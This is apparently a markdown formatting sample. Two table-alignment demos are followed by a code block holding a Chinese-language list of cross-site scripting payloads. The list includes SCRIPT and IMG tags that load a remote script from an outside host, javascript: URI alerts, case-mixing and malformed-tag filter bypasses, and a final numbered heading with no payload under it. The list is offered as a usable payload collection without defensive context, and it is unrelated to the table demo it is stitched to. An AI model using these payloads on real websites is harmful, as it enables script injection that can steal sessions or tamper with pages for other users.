

## Tables and alignment

First Header | Second Header
------------ | -------------
Content from cell 1 | Content from cell 2
Content in the first column | Content in the second column

| Left-Aligned  | Center Aligned  | Right Aligned |
| :------------ |:---------------:| -----:|
| col 3 is      | some wordy text | $1600 |
| col 2 is      | centered        |   $12 |


```
(1)普通的XSS JavaScript注入

<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
(2)IMG标签XSS使用JavaScript命令

<IMG SRC=http://3w.org/XSS/xss.js/>
(3)IMG标签无分号无引号

<IMG SRC=javascript:alert('XSS')>
(4)IMG标签大小写不敏感

<IMG SRC=JaVaScRiPt:alert('XSS')>
(5)HTML编码(必须有分号)

<IMG SRC=javascript:alert("XSS")>
(6)修正缺陷IMG标签

<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
(7)formCharCode标签(计算器)
```
